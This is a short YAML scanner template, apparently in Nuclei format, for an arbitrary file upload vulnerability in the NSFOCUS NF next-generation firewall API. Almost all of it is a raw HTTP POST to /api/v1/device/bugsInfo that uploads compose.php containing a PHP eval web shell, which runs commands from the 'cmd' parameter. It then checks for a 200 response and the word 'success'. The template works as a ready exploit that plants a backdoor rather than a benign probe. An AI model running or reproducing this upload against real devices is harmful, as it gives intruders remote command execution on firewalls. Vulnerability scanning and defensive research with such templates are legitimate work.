id: nsfocus-nf-firewall-upload

info:
  name: "绿盟NF下一代防火墙api 接口任意文件上传漏洞"
  author: 0dayPoc
  severity: high
  description: |-
  tags: 绿盟NF

http:
- raw:
  - |
    POST /api/v1/device/bugsInfo HTTP/1.1
    Host: {{Hostname}}
    Content-Type: multipart/form-data; boundary=4803b59d015026999b45993b1245f0ef

    --4803b59d015026999b45993b1245f0ef
    Content-Disposition: form-data; name="file"; filename="compose.php"

    <?php eval($_POST['cmd']);?>?
    --4803b59d015026999b45993b1245f0ef--
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'success'
